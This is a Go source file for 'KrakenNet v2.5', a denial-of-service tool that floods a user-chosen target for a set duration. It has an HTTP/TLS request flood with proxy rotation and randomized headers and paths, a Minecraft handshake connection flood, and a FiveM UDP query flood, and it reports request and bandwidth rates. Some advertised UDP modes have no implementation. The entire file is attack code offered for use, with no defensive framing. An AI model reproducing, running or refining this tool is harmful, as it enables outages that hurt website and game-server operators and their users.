package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

const (
	Reset     = "\033[0m"
	RedLight  = "\033[91m"
	Green     = "\033[32m"
	Yellow    = "\033[33m"
	Cyan      = "\033[36m"
	Magenta   = "\033[35m"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD"}
var proxies []string

func printBanner() {
	fmt.Print(RedLight, `
              ...-%@@@@@@@-..               
             .:%@@@@@@@@@@@@%-.             
            .#@@@@@@@@@@@@@@@@#.            
           .%@@@@@@@@@@@@@@@@@@%.           
           :@@@@@@@@@@@@@@@@@@@@:           
 ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. 
:@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-
@#.  -@@@- :@@@@@@@@@@@@@@@@@@@@:.:@@@-  .#@
:-. .%@@@: .@@@@@@@@@@@@@@@@@@@@..:@@@%. .-:
   .*@@@=:@:.@@@@@@@@@@@@@@@@@@.:@:=@@@#.   
  .#@@@+ .#+.=@@@@@@@@@@@@@@@@=.+%..+@@@#.  
 .%@@@#..#@...##@@@@@@@@@@@@##. .%#..#@@@%. 
.*@@@@. *@*  -@@@@@@@@@@@@@@@@- .+@*..@@@@*.
-@@@@@. %@@:..*@.*@@@@@@@@*.%* .:@@@..@@@@@-
=@@@@@: %@@@@@#@@@@@@@@@@@@@@%@@@@@%.:@@@@@+
=@@@@@@=.+@%+%@@@@@@@@@@@@@@@@@=%@+.=@@@@@@=
.@@@@@@@@@@@@+@@@@@@@@@@@@@@@@+@@@@@@@@@@@@.
 .*@@@@==*@@#@@%#@@@@@@@@@@#%@@#@@#=-@@@@*..
 .:#@@@@@+@@-@=%@@@@@@@@@@@@%=@-@@+@@@@@#:..
:@@@@@@@@=@@:#@@@@@@@##@@@@@@@%.@@=@@@@@@@@:
#@@@@@-:.*-@@@@@@@@@- .-@@@@@@@@@-*.:-@@@@@#
#@@@@@@@%-@@@@@@@%... ....%@@@@@@@-%@@@@@@@#
:@@@@@@@-%@@@@@:  =@@::@@=  :@@@@@%:@@@@@@@:
 .-@@@@@:@@@@@-    .@%%@.    -@@@@@:@@@@@-..
         #@@@@#....*@..@#....#@@@@#.        
         .%@@@@@@@@@+ .+@@@@@@@@@%.         
          .:@@@@@@+.   ..+@@@@@@:.          
`, Reset)

	fmt.Print(Cyan, `
_______________________
|  KrakenNet v2.5         |
------------------------
Made by Piwiii2.0
`, Reset)
}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func newHTTPClientTLSWithProxy(proxyStr string, connections int) *http.Client {
	proxyURL, _ := url.Parse(proxyStr)
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     10 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func sendUDP(conn net.Conn, payload []byte) bool {
	_, err := conn.Write(payload)
	return err == nil
}

func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps"}
	i := 0
	for bytes >= 1024 && i < len(units)-1 {
		bytes /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

func minecraftWorker(ctx context.Context, target string, port int) {
	addr := fmt.Sprintf("%s:%d", target, port)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				continue
			}
			buf := new(bytes.Buffer)
			protocolVersion := int32(754)
			writeVarInt(buf, protocolVersion)
			writeVarInt(buf, int32(len(target)))
			buf.WriteString(target)
			binary.Write(buf, binary.BigEndian, uint16(port))
			writeVarInt(buf, 1)
			handshakePacket := new(bytes.Buffer)
			writeVarInt(handshakePacket, int32(buf.Len()))
			handshakePacket.WriteByte(0x00)
			handshakePacket.Write(buf.Bytes())
			conn.Write(handshakePacket.Bytes())
			statusBuf := new(bytes.Buffer)
			writeVarInt(statusBuf, 1)
			statusBuf.WriteByte(0x00)
			conn.Write(statusBuf.Bytes())
			io.Copy(io.Discard, conn)
			conn.Close()
		}
	}
}

type FivemWorker struct {
	Target string
	Port   int
	Burst  int
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup, totalSuccess *int64, totalBytes *int64) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 0; i < fw.Burst; i++ {
				if _, err := conn.Write(payload); err == nil {
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(totalBytes, int64(len(payload)))
				}
			}
		}
	}
}

func runAttack() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")

	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print(Yellow + "Select method :\nkraken\ntls\nudp-discord\nudp-bypass\nudp-gbps\nfivem\nminecraft\n" + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	var connections, workers, port, durationSec int
	fmt.Print(Yellow + "Connections per worker: " + Reset)
	fmt.Scanf("%d\n", &connections)
	fmt.Print(Yellow + "Number of workers: " + Reset)
	fmt.Scanf("%d\n", &workers)
	fmt.Print(Yellow + "Port (only for UDP/FIVEM/Minecraft): " + Reset)
	fmt.Scanf("%d\n", &port)
	fmt.Print(Yellow + "Duration (seconds): " + Reset)
	fmt.Scanf("%d\n", &durationSec)

	if connections < 1 {
		connections = 10
	}
	if workers < 1 {
		workers = 10
	}
	if port < 1 {
		port = 30120
	}
	if durationSec < 1 {
		durationSec = 30
	}

	fmt.Println(Green + "Attack starting..." + Reset)

	var totalSuccess, totalFail, totalBytes int64
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	switch mode {
	case "tls", "kraken":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				proxy := randomFromList(proxies, "")
				client := newHTTPClientTLSWithProxy(proxy, connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if sendTLSRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			}()
		}
	case "minecraft":
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go minecraftWorker(ctx, target, port)
		}
	case "fivem":
		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
		var uploadMbps float64
		fmt.Scanf("%f\n", &uploadMbps)
		if uploadMbps <= 0 {
			uploadMbps = 1.0
		}
		burst := int(uploadMbps*1_000_000/120)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			worker := &FivemWorker{
				Target: target,
				Port:   port,
				Burst:  burst,
			}
			go worker.Start(ctx, &wg, &totalSuccess, &totalBytes)
		}
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		remaining := durationSec
		for range ticker.C {
			remaining--
			fmt.Printf("\rTime left: %d seconds", remaining)
			if remaining <= 0 {
				break
			}
		}
		fmt.Println()
	}()

	wg.Wait()

	fmt.Println(Magenta + "Attack complete. Results:" + Reset)
	if mode == "tls" || mode == "kraken" {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Printf("%sSuccess requests : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sFailed requests  : %d%s\n", RedLight, totalFail, Reset)
		fmt.Printf("%sDuration         : %d seconds%s\n", Cyan, durationSec, Reset)
		fmt.Printf("%sAverage RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
	} else {
		bps := float64(totalBytes) / float64(durationSec)
		fmt.Printf("%sSuccess packets : %d%s\n", Green, totalSuccess, Reset)
		fmt.Printf("%sFailed packets  : %d%s\n", RedLight, totalFail, Reset)
		fmt.Printf("%sDuration        : %d seconds%s\n", Cyan, durationSec, Reset)
		fmt.Printf("%sAverage BPS     : %s%s\n", Yellow, formatBytes(bps), Reset)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	printBanner()
	reader := bufio.NewReader(os.Stdin)
	for {
		runAttack()
		fmt.Print(Yellow + "\nDo you want to start another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(Green + "Script stopped" + Reset)
			break
		}
	}
}
